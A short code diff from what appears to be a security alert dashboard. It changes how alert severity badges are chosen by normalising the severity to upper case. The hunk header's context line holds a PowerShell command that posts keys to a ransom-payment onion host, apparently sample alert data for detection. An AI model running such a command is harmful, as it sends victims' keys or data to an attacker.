@@ -2385,10 +2385,11 @@ Invoke-WebRequest -Uri "http://ransom-payment-portal.onion/keys" -Method Post`,
                     if (data.alerts && data.alerts.length > 0) {
                         alertsList.innerHTML = data.alerts.map(alert => {
                             let sevBadgeClass = 'bg-secondary';
-                            if (alert.severity === 'CRITICAL') sevBadgeClass = 'bg-danger';
-                            else if (alert.severity === 'HIGH') sevBadgeClass = 'bg-warning text-dark';
-                            else if (alert.severity === 'MEDIUM') sevBadgeClass = 'bg-info text-dark';
-                            else if (alert.severity === 'LOW') sevBadgeClass = 'bg-success';
+                            const sev = (alert.severity || '').toUpperCase();
+                            if (sev === 'CRITICAL') sevBadgeClass = 'bg-danger';
+                            else if (sev === 'HIGH') sevBadgeClass = 'bg-warning text-dark';
+                            else if (sev === 'MEDIUM') sevBadgeClass = 'bg-info text-dark';
+                            else if (sev === 'LOW') sevBadgeClass = 'bg-success';
 
                             let fpStatusBadge = '';
                             if (alert.false_positive_status === 'MARKED_FALSE_POSITIVE') {
